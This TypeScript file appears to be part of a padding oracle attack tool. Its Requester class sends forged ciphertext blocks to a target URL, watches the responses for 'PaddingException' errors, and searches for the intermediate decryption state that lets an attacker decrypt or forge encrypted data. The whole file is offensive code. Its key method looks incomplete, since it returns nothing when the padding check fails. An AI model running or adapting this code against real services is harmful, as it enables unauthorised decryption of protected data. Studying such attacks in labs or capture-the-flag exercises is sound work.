import fetch from "node-fetch";
import CryptUtil from "./CryptUtil";
import TextUtils from "./TextUtils";

export default class Requester
{
  private readonly cu: CryptUtil;
  private readonly tu: TextUtils;

  constructor() {
    this.cu = new CryptUtil();
    this.tu = new TextUtils();
  }

  protected async send(payload: string): Promise<string> {
    const url = process.env.URL + payload;
  
    const resp = await fetch(url);
    if (!resp.ok) {
      throw new Error(`Fetch error (${resp.status}): ${resp.statusText}`);
    }
  
    return await resp.text();
  }

  protected paddingError(text: string): boolean {
    if (/PaddingException/gi.test(text)) {
      return true;
    }

    return false;
  }

  protected async checkPaddingValidity(payload: string): Promise<boolean> {
    const response = await this.send(payload);
    return !this.paddingError(response);
  }

  public async findIntermediateFingerprint(block: Buffer, fpBlock?: Buffer): Promise<Buffer> {
    if (typeof fpBlock === 'undefined') {
      fpBlock = this.cu.initialFPBlock(block.length);
    } else {
      fpBlock = this.cu.increasePadding(fpBlock);
    }

    const binData = this.cu.joinBlocks([fpBlock, block]);
    const payload = this.tu.bytes2src(binData);

    const result = await this.checkPaddingValidity(payload);

    if (result) {
      return fpBlock;
    }
  }
}